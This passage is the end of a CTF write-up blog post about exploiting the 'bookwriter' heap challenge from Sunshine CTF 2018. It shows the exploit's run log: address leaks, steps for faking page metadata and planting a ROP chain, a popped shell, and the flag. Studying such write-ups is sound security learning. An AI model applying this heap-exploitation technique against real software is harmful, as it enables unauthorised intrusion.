+<p>I had to fix up some heap addresses when going remote, since addresses seemed to be off, but we can reuse the <code>leak_addr</code> function for finding our payloads on heap again.</p>
+
+<p>And finally, after all addresses were fixed up:</p>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">python xpl.py 1
+[*] &#39;/vagrant/Challenges/sunshine/pwn/bookwriter/bookwriter&#39;
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RPATH:    &#39;/usr/local/lib:$ORIGIN&#39;
+[*] &#39;/vagrant/Challenges/sunshine/pwn/bookwriter/bookwriter-libc.so&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to chal1.sunshinectf.org on port 20002: Done
+[*] PIE leak       : 0x566456e0
+[*] PIE            : 0x56643000
+[*] HEAP leak      : 0x567300c8
+[*] LIBC leak      : 0xf764c670
+[*] LIBC           : 0xf7603000
+[*] ENVIRON        : 0x5672f008
+[*] LD LEAK        : 0xf77ea904
+[*] ECX            : 0xffc2961c
+[*] ONE            : 0xf763dc5c
+[*] Insert book page with page metadata pointing to ECX (in main ret)
+[*] Insert book page with ropchain
+[*] Remove page and overwrite page metadata pointing to our fake page
+[*] Remove fake page to overwrite ECX with pointer to ropchain
+[*] Paused (press any to continue)
+[*] Publish to trigger shell
+[*] Switching to interactive mode
+Page 1449416416:
+
+COVER
+
+
+Page 1450377416:
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+
+
+Page 1450377560:
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+
+
+$ ls
+bookwriter
+flag.txt
+$ cat flag.txt
+sun{pl34s3_st0p_t34r1ng_p4g3s_0ut_0f_th3_b00k!}</code></pre></div>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=sunshine CTF 2018 - bookwriter&amp;url=https://kileak.github.io/ctf/2018/sunshince-bookwriter/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2018/sunshince-bookwriter/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2018/sunshince-bookwriter';
+        var disqus_title = 'sunshine CTF 2018 - bookwriter';
+        var disqus_url = 'https://kileak.github.io/ctf/2018/sunshince-bookwriter';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2024 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
